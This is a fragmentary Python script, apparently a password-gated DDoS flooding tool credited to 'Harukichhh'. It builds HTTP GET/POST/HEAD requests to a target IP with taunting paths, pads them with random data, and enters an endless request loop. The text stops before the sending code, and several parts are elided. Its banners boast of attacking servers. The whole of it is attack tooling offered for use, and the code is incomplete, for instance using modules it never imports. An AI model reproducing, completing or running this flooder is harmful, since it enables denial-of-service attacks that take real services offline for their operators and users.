...
import time
import os
os.system('color ' +random.choice(['B'])+ " Banzaii [ Enter Pass ]")
password = input("[ + ] Password : ")
if password == "BanzaiSengper":
...
if sys.platform.startswith("linux"):
   ...
   os.system('color ' +random.choice(['B'])+ " & cls & title Tools DDoS Harukixx [ DDoS Attack ]")
   

print("=======================================================================================")
print("[ × ]  Harukichi_Yamaguchi [ × ]")
print("[ + ]  You can't kill me")
print("[ + ] Server sehat bos?")
print("=======================================================================================")
print("[ + ] Author: Harukichhh")
print("[ + ] Update Tool: Kang Banzaii")
print("==========================")
...
def Headers(method, referers=None):
    ...
    if method == "get" or method == "head":
        post_host = "POST /Your_Server_Got_DDoS_By_Harukicxx_Will_Not_Surrender HTTP/1.1\r\nHost: " + ip + "\r\n"
...
os.system('color ' +random.choice(['B'])+ " & cls & title Tools DDoS Used By Harukixx[ DDoS Attack ]")
def run():
    header = Headers("get")
    i = random.choice(("[*]","[!]","[#]"))
    data = random._urandom(20179)
    if method_attack == "1":
        get_host = "GET /Your_Server_Got_DDoS_By_Harukicxx_Will_Not_Surrender HTTP/1.1\r\nHost: " + ip + "\r\n"
        request  = get_host + header + "\r\n"
    else:
        get_host = random.choice(['GET','POST','HEAD']) + " /Your_Server_Got_DDoS_By_Harukixx_Will_NoSurrender HTTP/1.1\r\nHost: " + ip + "\r\n"
        request  = get_host + header + "\r\n"
    while True:
        try:
